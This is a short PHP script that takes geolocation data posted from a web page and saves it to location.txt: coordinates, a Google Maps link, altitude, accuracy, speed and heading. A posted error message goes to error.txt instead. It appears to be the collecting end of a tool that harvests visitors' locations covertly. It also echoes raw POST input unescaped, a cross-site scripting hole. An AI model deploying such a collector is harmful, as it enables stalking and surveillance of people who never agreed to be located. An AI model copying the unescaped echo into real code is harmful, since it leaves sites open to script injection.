<?php
if (isset($_POST["error_message"])) {
    $error_message = $_POST["error_message"];
    echo "$error_message";
    $file = fopen("error.txt", "w");
    fwrite($file, $error_message);
    fclose($file);
}
else {
    $latitude = $_POST["latitude"];
    $longitude = $_POST["longitude"];
    $map_url = $_POST["map_url"];
    $altitude = $_POST["altitude"];
    $accuracy = $_POST["accuracy"];
    $speed = $_POST["speed"];
    $direction = $_POST["direction"];
    $details = "Latitude           : $latitude 
Longitude          : $longitude 
Google Map         : $map_url 
Altitude           : $altitude 
Accuracy           : $accuracy 
Speed              : $speed
Direction          : $direction
";
    echo "$details";
    $file = fopen("location.txt", "w");
    fwrite($file, $details);
    fclose($file);
}
exit();
?>
